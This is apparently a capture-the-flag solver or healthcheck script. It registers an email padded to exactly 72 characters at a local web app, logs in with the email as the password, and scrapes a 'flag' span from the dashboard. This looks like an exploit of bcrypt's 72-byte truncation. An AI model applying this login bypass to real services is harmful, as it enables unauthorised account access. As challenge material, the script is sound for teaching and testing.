#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import sys
import random
import string
import re

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

name = "".join(random.choices(string.ascii_lowercase, k=16))
domain = "gmail.com"
email = f"{name}+{'A'*(72 - 2 - len(name+domain))}@{domain}"

print(f"Email: {email}")

with requests.Session() as session:
    res = session.post(f"{BASE_URL}/user", data={"email": email})
    if res.status_code != 200:
        sys.exit(1)

    res = session.post(f"{BASE_URL}/session", data={"email": email, "password": email})
    if res.status_code != 200:
        session.get(f"{BASE_URL}/logout")
        sys.exit(1)

    res = session.get(f"{BASE_URL}/dashboard")
    if res.status_code != 200:
        session.get(f"{BASE_URL}/logout")
        sys.exit(1)

    match = re.search(r'<span id="flag">(.*)<\/span>', res.text)
    if not match:
        session.get(f"{BASE_URL}/logout")
        sys.exit(1)

    session.get(f"{BASE_URL}/logout")
exit(0)
